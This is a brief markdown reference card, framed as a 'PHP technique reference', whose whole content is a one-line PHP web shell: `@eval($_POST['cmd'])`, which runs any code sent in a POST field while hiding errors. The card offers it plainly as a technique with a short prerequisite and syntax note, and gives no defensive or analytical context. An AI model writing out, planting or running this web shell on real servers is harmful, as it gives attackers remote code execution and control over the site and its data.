# PHP technique reference

**Prerequisites:**
- An untrusted request reaches eval.

```php
<?php @eval($_POST['cmd']); ?>
```

**Syntax:**
- eval interprets the request text.
